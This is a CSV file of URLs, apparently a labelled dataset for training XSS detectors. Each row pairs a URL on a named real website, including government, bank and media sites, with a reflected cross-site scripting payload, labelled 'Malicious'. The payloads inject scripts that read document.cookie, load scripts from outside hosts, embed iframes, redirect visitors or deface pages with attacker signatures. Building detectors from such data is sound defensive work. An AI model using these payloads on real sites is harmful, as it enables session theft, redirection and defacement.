Payloads,Class
"http://wdb1.sco.com/kb/tasearch.results?days=';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,<br>83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(string.fro<br>mcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,82,73,84<br>,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,<br>73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.mfnca.gov.ae/?lang=ar&amp;m=options&amp;act=ministry_inthe_media&amp;cat=33&amp;page=%22%3e%3cscript%3eal<br>ert%28%22true%20promise%20team%20-%20sec-krb.com%22%29%3c/script%3e,Malicious
http://www.store.euro2008.uefa.com/index.php?nv=moteurresults&amp;search=%22%3e%3cscript+src%3dhttp%3a%2<br>f%2fha.ckers.org%2fxss.js%3e%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.pirateaccess.com/?to=results&amp;q=%22%3e%3ch1%3edr.optix+%3a%3a+html+injection+%3a%3a+poc%3c<br>%2fh1%3e,Malicious
"http://basketball.fc-finnentrop.de/fc/guestbook1/admin/guestbook.admin.php?action=settings&amp;guestbook<br>_id=0&amp;language=german&amp;gmt_ofs=0%22%3e%3cscript%3ealert%28string.fromcharcode%2867,114,52,116,51,114,<br>32,87,97,115,32,72,101,114,101%29%29%3c/script%3e",Malicious
http://www.marinedepot.com/aquarium_additives_hagen_cycle_aqua_plus_water_conditioner_waste_control_<br>ph_chlor-x.asp?cartid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://itineraires.france2.fr/francetv/map/map.asp?x=598792&amp;y=2426964&amp;scale=5000&amp;title=&lt;script&gt;alert<br>(&quot;scriptorium(turkey) hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.evrensel.net/dunya.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://neohackteam.net/mkportal/include/pmpopup.php?u1=www.redeye.org&amp;m1=&lt;script&gt;alert(%2%200documen<br>t.cookie)&lt;/script&gt;&amp;m2=&lt;h1&gt;hacked%20&lt;/h1&gt;&amp;m3=by&amp;m4=&lt;h1&gt;red%20eye//the_redeye@hotmail.de&lt;/h1,Malicious
http://www.milkcafe.net/test/read.cgi/%22%3e%3cbody%20onload%3dalert%28%27kusomiso%2ecom%27%29%3e,Malicious
http://www.evrensel.net/sendika.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.laut.de/lautshop/preisvergleich/lautshop_preisvergleich_detail.php?keywords==&quot;&gt;&lt;script&gt;al<br>ert(document.cookie)&lt;/script&gt;,Malicious
http://ricerca.rai.it/raisearch.asp?method=mainquery&amp;batchhits=10&amp;querysummarycb=querysummary&amp;datera<br>nge=lastdays&amp;selectlastdays=10000&amp;xoptions=sortboth&amp;numresults=300&amp;querythreshold=40&amp;attachto=names%<br>3dnews%2braisport%2brainews24%2binforegioni%2brunopersonaggi%2brunopuntaterunoprogrammi%2brunomedia%<br>2brduepuntate%2brdueprogrammi%2brduemedia%2brtrepersonaggi%2brtrepuntate%2brtreprogrammi%2brtremedia<br>%2braiinternational%2bgrr%2bufficiostampa%2bradiorai%2braieducational%2bsciuscia%2bitalica%2bcinema%<br>2bcultura%2bsocieta%2bsanremo%2braieri%2braiway%2brduepersonaggi%2brunostoria%2boccupati%2braiclick%<br>2bsmartweb&amp;query=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;canale=tutti,Malicious
http://services.sea.lau.edu.lb/login/validate.asp?baseframe=1%3e%22%3e%3cscript%20%0a%0d%3ealert%28%<br>27f0rtys3v3n%27%29%3b%3c/script%3e,Malicious
http://www.spele.nl/zoek/%22%3e%3cscript%3ealert%28/killer-tr/%29%3c/script%3e,Malicious
http://www.dr.dk/player/player.asp?subsite=nyheder&amp;listtype=nyheder%22%3c/iframe%3e%3cscript%3ealert<br>%281%29%3c/script%3e%3c!--,Malicious
http://www.iict.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://mtv2.mtv.com/search/?searchterm=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%22%3e%3cscript%<br>3ealert%281%29%3c%2fscript%3e&amp;searchtype=1,Malicious
http://ms142.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://asp.usatoday.com/community/tags/topic.aspx?req='%22%3e%3cscript%3ealert('xss')%3c/script%3e%3<br>e%3cmarquee%3e%3ch1%3eby+ivan_sanchez%3c/h1%3e%3c/marquee%3e,Malicious
http://lt.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://www.afcea.org/education/scholarships/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.engr.wisc.edu/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e<br>%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://blog.netscape.com/search/?q=%27%22%3e%3cimg%20src=foo.png%20onerror=alert(/xss/)%20/%3e%3cmar<br>quee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.bagongshan.gov.cn/dzbwg/bbs/login.asp?url=%22%3e%3cscript%3ealert(1)%3c/script%3e%3ca%20n<br>ame=%22,Malicious
http://www.vodafonelive.de/cp/logotones?vf_partnerurl=%3c/script%3e%3cscript%3ealert(%22totalschaden<br>%22)%3c/script%3etotalschaden,Malicious
https://apra.umd.edu/search.jsp?id=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious
http://www.huracan.guatemala.gob.gt/discurso.php?codigo=1154&amp;tipo=%22%3e%3cscript%3ealert(/xssed!/);<br>%3c/script%3e,Malicious
http://www.europa-union.de/publikationen/newsletter/?tx_pbsurvey_pi1[77][0][0]=%22%3e%3ch1%3eding%20<br>ding%20ding%20ding%20ding%20ding%3c/h1%3e%3cimg%20src=//www.gamgea.com/wp-content/uploads/2010/06/re<br>tro-mario-in-3d-flavor.gif%3e,Malicious
http://zisi.eu/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/scrip<br>t&gt;,Malicious
http://www.ekd.ne.jp/kakolog/test/ir.cgi/'%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marq<br>uee%3e,Malicious
http://www.news.com/2038-12_3-0-topic.html?id=7965&amp;name=%22%3e'%3e%3cscript%3ealert(123)%3c/script%3<br>e%22'&amp;tag=st.topic,Malicious
http://tool.studio-x1.com/viewer/index.php?site='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://www.twotop.co.jp/simple/search.asp?qu=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ec<br>om%2fx%2ejs%3e%3c%2fscript%3e%0d%0a,Malicious
"http://digilib.litbang.depkes.go.id/search.php?s=dc_person&amp;frm[tag][]=fullname&amp;frm[q][]=';alert(stri<br>ng.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,<br>83,83))//\&quot;;alert(string.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(<br>88,83,83))&lt;/script&gt;&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;<br>frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;<br>frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]<br>=and&amp;b=search",Malicious
http://english.mw.go.kr/front_eng/al/sal0101vw.jsp?par_menu_id=1002&amp;menu_id=100201&amp;page=1&amp;board_id=1<br>350&amp;board_flag=00&amp;cont_seq=134425&amp;searchkey=&amp;searchvalue=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.blogexplosion.com/profile.php?term=chid+planting}%3c/style%3e%3cscript%3ea=eval;b=alert;a<br>(b(/xss/.source));%3c/script%3e,Malicious
http://www.benq.co.id/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.simkom.com/sketchsite/image.php?id=126650775024196%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,Malicious
http://registrocivil.gov.ar/areas/turismo/actividades/index.php?lang=es=%22%3e%3ciframe%20src=http:/<br>/www.google.com/%3e%3c/iframe%3e,Malicious
http://www.epson.com.mx/asp/busqueda.asp?texto=%3e%22%3e%3cscript%3ealert%28%27norehem+was+here%21%2<br>1%27%29%3c%2fscript%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem+was+here%3c%2fmarquee%3e%3c%2fh1%<br>3e%3c%2fh1%3e%3c%2fh1%3e%3ccenter%3e%3cimg+src%3d%22http%3a%2f%2fwww.cibernautica.com%2fforocibernau<br>tica%2fupload%2fnorehemzu4.gif%22%3e%3c%2fcenter%3e%3ciframe+src%3dhttp%3a%2f%2fjersain.iespana.es%2<br>fxss.html+%3c&amp;image2.x=0&amp;image2.y=0,Malicious
http://www.speedy.com.ar/terabox/index.php?section=terminos%27%22%3e%3c/script%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious
http://www.uctv.tv/library2.asp?sort=01&amp;title=&amp;keyword=conversations%20with%20history&amp;showid=%22%3e%<br>3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://ct.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
https://www.redhat.com/wapps/sso/rhn/login.html?redirect=%22%3e%3cscript%3ealert(%22xss%20by%20fugit<br>if%22)%3c/script%3e,Malicious
http://ipnear.com/results.php?s=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;submit=loo<br>kup,Malicious
http://ms122.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://kp-web.jp/cgi/whatsnew/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn.eu<br>%27%29%3c%2fscript%3e,Malicious
http://www.sec.gov.qa/content/general/search?keywords=%3c%2fscript%3e%3cscript%3ealert%28%22noph0bia<br>%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
"http://au.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://fr.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.unitedweb.no/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.torp.no/?guid={a6sg6uam33nw3tizdyhmh41}&amp;lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3<br>cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.positivafm.com.br/busca/?q=dd%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.novonordisk.gr/search.asp?query=%cf%83%cf%84%ce%b7%ce%bd&amp;st=11&amp;rq=0&amp;col=affil&amp;charset=utf<br>-8&amp;qp=site:novonordisk.gr&amp;ql_col_switch=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27<br>%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.towerdefence.net/?page=news_read&amp;title=%3c/title%3e%3cbody%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e&amp;news_id=1147,Malicious
http://www.sarvan.net/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://en.jiuzo.net/en/search.asp?cpname=ss&amp;imagefield.x=8&amp;imagefield.y=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;,Malicious
http://www.rarlab.com/gp_continent.php?continent=%3cscript%3ealert('the_miller')%3c/script%3e,Malicious
http://icsurreyonline.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced<br>.org/)%3c/script%3e%3cp,Malicious
http://www.antikorupcija-savet.sr.gov.yu/view.jsp?articleid=%22%3e%3cscript%3ealert(1)%3c/script%3e%<br>3c/textarea%3e%3cscript%3ealert(%22kaksii_was_here%22)%3cscript%3ealert('kaksii_was_here');alert(1)%<br>3c/script%3e%22%3c/html%3e%3chtml%3e%3cscript%3ealert(10111)%3c/script%3e%3cdiv%20align=center%3e%20<br>%3cfont%20size=4%3e%3ctextarea%20name=1%20cols=100000%20rows=10000%20id=1%3ekaksii%20was%20here%3c/t<br>extarea%3e%3c/font%3e%3c/div%3e%3cnoscript%3e%3cplaintext%3e,Malicious
http://www.vector.com.mx/cgi-bin/internet-vip.sh/publicos/mercados/buscar.htm?emisora=%3ch1%3e%3cmar<br>quee%3exssed_by_uber0n%3c/marquee%3e%3c/h1%3e&amp;idioma=0,Malicious
http://www.zdnet.co.uk/search/index.htm?q=open+source&amp;ss=date&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&amp;p=3&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.m6.fr//cms/custom/includes/colgauchem6generique.jsp?css=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,Malicious
http://pd.acm.org/book_detail.cfm?isbn=9780131481046%22%3e%3cscript%3ealert(%22found%20by%20alexalgh<br>isi%22)%3c/script%3e,Malicious
http://www.www.com/top_frame.php?q=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%2<br>7%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2c8<br>3%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript%3<br>e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e,Malicious
http://www.hsbc.co.uk/1/2/!ut/p/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkln4l39gljmmu7xrub6kciixjeo8ifgv<br>s99x098nnt9qp0c3jdi8odhrubf0cb6a!!/delta/base64xml/l0lkayevd0znqurbisevnelfrs9jbnrlcm5hbfnlyxjjaa!!;<br>jsessionid=0000rszl-xicinnawwljlabjmjq:12ntf1n0a?sq=--%3etesticles&amp;st=1&amp;ssid=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;stask=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3eeukuka00<br>01,Malicious
http://deltaweathercam.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.yuchooz.com/?hl=en&amp;q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tib.wa.gov/news/newsstory.asp?stid=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdp<br>arty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.cmmt.csiro.au/research/urbanwater/pipes/pipe-s.cfm?printmode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.orange.mu/webdirectory/review.php?id=378&amp;current=religion&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious
http://www.blogs.se/search.php?word=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%3e&amp;category=tagpo<br>st,Malicious
http://www.emp.lt/?mact=search%2ccntnt33%2cdosearch%2c0&amp;cntnt33returnid=15&amp;cntnt33searchinput=%3cscr<br>ipt%3ealert%28document.cookie%29%3c%2fscript%3e&amp;cntnt33submit.x=0&amp;cntnt33submit.y=0,Malicious
http://www.rapidcounter.com/signup.php?style=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://guides.ovh.com/tiki-flash.php?file=xylitol.swf%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20rd%3c/h1%3e%3c/marquee%3e,Malicious
http://www.schema.angstrom.uu.se/4daction/webshowsearch/2/1-0?wv_type=4&amp;wv_ts=20080906t104746x1858&amp;w<br>v_search=%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;wv_bsearch=s%f6k&amp;wv_startweek=836&amp;wv_stopwe<br>ek=838,Malicious
http://www.impgc.com/paging.php?id=m%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.electronics-electricals.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://cc.emirates.net.ae:82/www/web_directory.testing?lang=eng&amp;type_category=all&amp;search_key=%27%22%<br>3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%3ecueballr%3c%2fstrong%3e%3c%2fh1%3e%3c%2fmarquee%3e&amp;page_no=0,Malicious
http://www.previdenciasocial.gov.br/conteudodinamico.php?id=%22%3e%3cscript%3ealert(/illuz1on@r00tde<br>faced.net/)%3c/script%3e,Malicious
http://www.joymag.co.za/article.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
https://www.coliposte.net/pro/services/main.jsp?m=12003010&amp;historybt=okent&amp;colispro=%27%22%3e%3c%2ft<br>itle%3e%3cscript%3ealert(1337)%3c%2fscript%3e,Malicious
http://boutique.gemalto.com/is-bin/intershop.enfinity/wfs/gemalto-b2ccorp-site/en_us/-/eur/viewparam<br>etricsearch-simpleoffersearch?wfsimplesearch_nameorid=//--&gt;&lt;/script&gt;&lt;iframe<br>src=http://xssed.com/&gt;&lt;/iframe&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ecoletheologique-stcyprien.org/index.php?option=com_doqment&amp;cid=%27%22%3e%3c/title%3e%3cs<br>cript%3ealert%281337%29%3c/script%3e,Malicious
http://www.hipernet24.pl/se.php?sw=duracell%22%3e%3cscript%3ealert%28/pyske/%29%3c/script%3e,Malicious
http://www.evzane.com/main/search_results.asp?words=%3c/title%3e%22%3e%3cscript%3ealert(%22backdoor%<br>22)%3c/script%3e,Malicious
http://citationmachine.net/index.php?page=%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3<br>e,Malicious
http://apps.conduit.com/search?q=&amp;searchsourceorigin=2%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e9&amp;ctid=ct2504091%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e&amp;octid=ct25%27%2<br>2%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e04091,Malicious
http://turk-h.org/taskmanager/&lt;marquee&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;&lt;/marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3e,Malicious
http://shop.nationalgeographic.com/subscribemain.jsp?email=%22%3e%3cscript%3ealert%281%29%3c%2fscrip<br>t%3e&amp;submit2.x=25&amp;submit2.y=15&amp;submit2=submit,Malicious
https://store.pentontech.com/index.cfm?s=1&amp;cid=47&amp;promotionid=18000663&amp;code=&quot;&gt;&lt;script&gt;alert(&quot;fugitif<br>&quot;)&lt;/script&gt;,Malicious
"http://raydaydeebord.board.ob.tc/-view.php?n=40""><script>alert(document.cookie)</script>",Malicious
http://www.jumbocorp.com/sresult.asp?q=%22+%27%3e%3cscript%3ealert(%27cueballr%27)%3c%2fscript%3e&amp;im<br>agefield.x=0&amp;imagefield.y=0,Malicious
"http://www.universalstudios.com/contact_form.php?email_id=%22%3e%3c/script%3e%3cscript%3ealert(strin<br>g.fromcharcode(120,115,115))%3c/script%3e",Malicious
http://www.knyguklubas.lt/lt.php/knygos/245?q=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e&amp;s=&amp;x=18&amp;<br>y=9,Malicious
http://www.cnlcs.min-saude.pt/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;script<br>&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.hsbc-reim.fr/resultats.asp?ct=hsbcccfreim&amp;qu=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(133<br>7)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://television.aol.com/?zip=%22%3e%3cscript%3ealert('i-landet');%3c/script%3e,Malicious
http://cnn.search.aol.com/aol/weboffers?invocationtype=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%<br>3e&amp;query=query1,Malicious
http://www.ducati.com/profile/login.jsp?urlloginsuccess=%22%3e%3cscript%3ealert(1337)%3c/script%3es,Malicious
http://exipnimetakinisi.e-transport.gov.gr/error.asp?errormessage=%3cscript%3ealert%28string.fromcha<br>rcode%2883%2c116%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3e<br>st%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
"http://inregistry.in/cgi-bin/whois.cgi?whois_query_field=%22%3e%3cscript%3ealert(%22all%20nics%20hav<br>e%20bugs%20lol,%20world%20under%20risk..%22)%3c/script%3e",Malicious
http://www.freehostspace.com/cgi-bin/xpanel/amanager.cgi?persistent=&amp;login=%22%3e%3cscript%3ealert%2<br>8%27hacking-gurus.com+pwned+by+%21%21neo%21%21+hacking-gurus.com%27%29%3c%2fscript%3e%3cimg+src%3d%2<br>2http%3a%2f%2fimg149.imageshack.us%2fimg149%2f1232%2flogonj5.gif%22%3e%3c&amp;passwd=&amp;action=log+in,Malicious
http://www.achaea.com/irex/helpview/help.php?q=%22%3e%3cscript%3ealert(%22xss%22)%3c%2fscript%3e&amp;x=h<br>elp,Malicious
http://www.endlesspossibilities.us/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious
http://www.youareblocked.net/index.php?user=&quot;&gt;&lt;script&gt;alert(/fuck/)&lt;/script&gt;&amp;pass=&quot;&gt;&lt;script&gt;alert(/f<br>uck/)&lt;/script&gt;&amp;recom=1&amp;submit=&quot;&gt;&lt;script&gt;alert(/fuck/)&lt;/script&gt;,Malicious
http://www.cmo-oldenburg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://bangbros.com/t1/pps=bbonet/websites?mode=show&amp;s=milfsoup%3cscript%3ealert(string.fromcharcode<br>(79,%2077,%2071,%2080,%2079,%2082,%2078));%3c/script%3e",Malicious
http://www.electronic-business-forum.de/4/bitkom.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/scr<br>ipt&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.nisanyan.net/otl_search.asp?smode=2&amp;region=4&amp;region2=&quot;&gt;&lt;script&gt;alert('0ssi3-xht')&lt;/script<br>&gt;,Malicious
http://ec.trade.gov.cn/selloffers.php?tmp=1&amp;show_save=yes&amp;keyword=%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e,Malicious
http://www.excite.co.jp/bbs/blog/technic/thread?mode=id&amp;t=1143553'%3e%22%3e%3cscript/src=http://kuso<br>miso.com/xss.js%3e%3c/script%3e&amp;m=1&amp;submit22=%95%5c%8e%a6,Malicious
http://vacaturekrant.nl/vd.fpl?id=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;vkref=resultaat&amp;highlight=&amp;highlight<br>=&amp;highlight=,Malicious
http://www.bursa-hosting.org/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%3<br>7%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39<br>%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
